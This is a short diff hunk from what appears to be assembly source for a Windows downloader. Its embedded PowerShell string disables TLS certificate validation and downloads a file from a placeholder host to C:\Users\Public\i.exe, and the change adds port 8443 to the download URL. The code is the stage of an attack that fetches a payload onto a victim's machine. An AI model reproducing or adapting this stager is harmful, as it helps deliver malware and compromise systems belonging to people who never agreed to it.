@@ -118,7 +118,7 @@ cmd:
     db '[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
     db '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;'
     db '(New-Object Net.WebClient).DownloadFile('
-    db 0x27, 'https://HOST_IP/update/DOWNLOAD_TOKEN', 0x27
+    db 0x27, 'https://HOST_IP:8443/update/DOWNLOAD_TOKEN', 0x27
     db ','
     db 0x27, 'C:\Users\Public\i.exe', 0x27
     db ');'
